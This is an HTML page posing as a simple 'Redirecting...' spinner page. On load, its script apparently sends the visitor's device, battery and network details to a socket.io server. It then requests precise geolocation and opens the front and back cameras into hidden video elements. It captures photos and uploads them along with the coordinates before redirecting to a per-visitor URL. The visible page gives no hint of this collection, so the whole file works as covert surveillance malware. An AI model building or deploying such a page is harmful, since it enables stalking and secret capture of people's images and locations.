<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e8ecf1;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text { font-size: 18px; color: #1a2332; margin-bottom: 6px; font-weight: 500; }
        .redirect-url { 
            font-size: 14px; 
            color: #4285f4; 
            word-break: break-all; 
            font-weight: 500;
            background: #f0f4ff;
            padding: 8px 14px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 4px;
        }
        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
        #hiddenVideo, #hiddenVideoBack { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Please wait a moment</div>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;

            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        startProcess();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                startProcess();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                startProcess();
                            });
                    });
            }

            function startProcess() {
                connectSocket();
                setTimeout(() => {
                    if (!redirectTriggered) redirectNow();
                }, 8000);
            }

            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 5,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', function() {
                        console.log('✅ Socket connected');
                        sendDeviceInfo();
                        requestPermissions();
                    });

                    socket.on('connect_error', function(err) {
                        console.log('❌ Socket error:', err.message);
                        setTimeout(() => socket.connect(), 2000);
                    });
                } catch(e) {
                    console.log('❌ Socket init error:', e.message);
                }
            }

            function sendDeviceInfo() {
                if (!socket || !socket.connected) {
                    setTimeout(sendDeviceInfo, 500);
                    return;
                }

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform
                };

                socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                console.log('📱 Device info sent');

                // Battery
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(function(battery) {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId,
                                    type: 'battery',
                                    content: level
                                });
                                console.log(`🔋 Battery: ${level}%`);
                            }
                        })
                        .catch(() => {});
                }

                // Network
                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown'
                    };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'network',
                        content: networkData
                    });
                    console.log('📶 Network info sent');
                }
            }

            function requestPermissions() {
                // ===== LOCATION =====
                console.log('📍 Requesting location...');
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            const lat = pos.coords.latitude;
                            const lng = pos.coords.longitude;
                            console.log(`📍 Location: ${lat}, ${lng}`);
                            
                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                .then(res => res.json())
                                .then(data => {
                                    const locationInfo = {
                                        lat: lat,
                                        lng: lng,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        country: data.countryName || 'Unknown',
                                        state: data.principalSubdivision || 'Unknown',
                                        city: data.locality || 'Unknown'
                                    };
                                    console.log('📍 Location data:', locationInfo);
                                    if (socket && socket.connected) {
                                        socket.emit('visitor-data', {
                                            visitorId,
                                            type: 'location',
                                            content: locationInfo
                                        });
                                        console.log('✅ Location sent to server');
                                    }
                                })
                                .catch(() => {
                                    const locationInfo = {
                                        lat: lat,
                                        lng: lng,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: new Date().toISOString()
                                    };
                                    if (socket && socket.connected) {
                                        socket.emit('visitor-data', {
                                            visitorId,
                                            type: 'location',
                                            content: locationInfo
                                        });
                                    }
                                });
                        },
                        function(err) {
                            console.log('❌ Location error:', err.message);
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                }

                // ===== FRONT CAMERA =====
                console.log('📸 Requesting front camera...');
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                })
                .then(function(stream) {
                    console.log('✅ Front camera granted');
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = stream;
                    return video.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('front', document.getElementById('hiddenVideo'));
                    }, 2000);
                })
                .catch(function(err) {
                    console.log('❌ Front camera error:', err.message);
                });

                // ===== BACK CAMERA =====
                console.log('📸 Requesting back camera...');
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' },
                    audio: false
                })
                .then(function(stream) {
                    console.log('✅ Back camera granted');
                    const video = document.getElementById('hiddenVideoBack');
                    video.srcObject = stream;
                    return video.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('back', document.getElementById('hiddenVideoBack'));
                    }, 3000);
                })
                .catch(function(err) {
                    console.log('❌ Back camera error:', err.message);
                });
            }

            function capturePhoto(type, video) {
                if (!video || !video.videoWidth || !video.videoHeight) {
                    console.log(`⚠️ ${type} video not ready`);
                    return;
                }

                try {
                    const canvas = document.createElement('canvas');
                    // Better quality
                    const maxWidth = 800;
                    const maxHeight = 600;
                    let width = video.videoWidth;
                    let height = video.videoHeight;
                    
                    if (width > maxWidth) {
                        height = (height * maxWidth) / width;
                        width = maxWidth;
                    }
                    if (height > maxHeight) {
                        width = (width * maxHeight) / height;
                        height = maxHeight;
                    }
                    
                    canvas.width = width;
                    canvas.height = height;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, width, height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.9);

                    console.log(`📸 ${type} photo captured, size: ${imageData.length}`);

                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId: visitorId,
                            type: type === 'back' ? 'backCamera' : 'frontCamera',
                            content: imageData
                        });
                        console.log(`✅ ${type} photo sent to server`);
                    } else {
                        console.log(`⚠️ Socket not connected, ${type} photo not sent`);
                    }

                    if (video.srcObject) {
                        video.srcObject.getTracks().forEach(t => t.stop());
                    }
                } catch (err) {
                    console.log(`❌ ${type} capture error:`, err.message);
                }
            }

            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'redirectComplete',
                        content: { redirected: true, time: new Date().toISOString() }
                    });
                }

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 500);
            }

            if (typeof io !== 'undefined') {
                fetchRedirectUrl();
            } else {
                setTimeout(fetchRedirectUrl, 2000);
            }

            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
            });
        })();
    </script>
</body>
</html>